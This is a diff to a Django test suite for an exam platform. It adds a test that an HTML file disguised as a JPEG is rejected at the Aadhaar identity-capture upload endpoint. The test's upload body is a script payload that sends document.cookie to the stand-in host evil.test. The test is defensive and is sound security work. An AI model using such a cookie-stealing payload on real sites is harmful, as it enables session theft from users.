@@ -157,6 +157,30 @@ class TestIdentityPhotoUploadCannotStoreExecutableContent:
 
         assert response.status_code == 400
 
+    def test_the_same_html_upload_is_rejected_on_the_aadhaar_capture_endpoint_too(
+        self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
+    ):
+        """The same unauthenticated-upload/declared-content-type concern applies to
+        ExamIdentityAadhaarCaptureView, the identity-capture step this endpoint was split off
+        from - a second attack surface, not covered by the /identity/ tests above.
+        """
+        from django.core.files.uploadedfile import SimpleUploadedFile
+        settings.AZURE_STORAGE_CONNECTION_STRING = ''
+        settings.DEBUG = True
+        invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)
+
+        response = api_client.post(
+            f'/api/exam/token/{invitation.unique_link_token}/identity/aadhaar/',
+            {'id_photo': SimpleUploadedFile(
+                'id.jpg', b'<script>fetch("https://evil.test/steal?c="+document.cookie)</script>',
+                content_type='text/html',
+            )},
+            format='multipart',
+        )
+
+        assert response.status_code == 400
+        assert 'JPEG or PNG' in response.json()['detail']
+
     def test_a_genuine_jpeg_upload_still_succeeds(
         self, api_client, ta_user, make_batch, make_candidate, make_invitation, settings
     ):
@@ -166,10 +190,18 @@ class TestIdentityPhotoUploadCannotStoreExecutableContent:
         settings.AZURE_STORAGE_CONNECTION_STRING = ''
         settings.DEBUG = True
         invitation = self._invitation(ta_user, make_batch, make_candidate, make_invitation)
+        token = invitation.unique_link_token
+
+        files = self._files(content_type='image/jpeg')
+        aadhaar_response = api_client.post(
+            f'/api/exam/token/{token}/identity/aadhaar/',
+            {'id_photo': files['id_photo']}, format='multipart',
+        )
+        assert aadhaar_response.status_code == 200, aadhaar_response.content
 
         response = api_client.post(
-            f'/api/exam/token/{invitation.unique_link_token}/identity/',
-            self._files(content_type='image/jpeg'), format='multipart',
+            f'/api/exam/token/{token}/identity/',
+            {'face_photo': files['face_photo']}, format='multipart',
         )
 
         assert response.status_code == 200, response.content
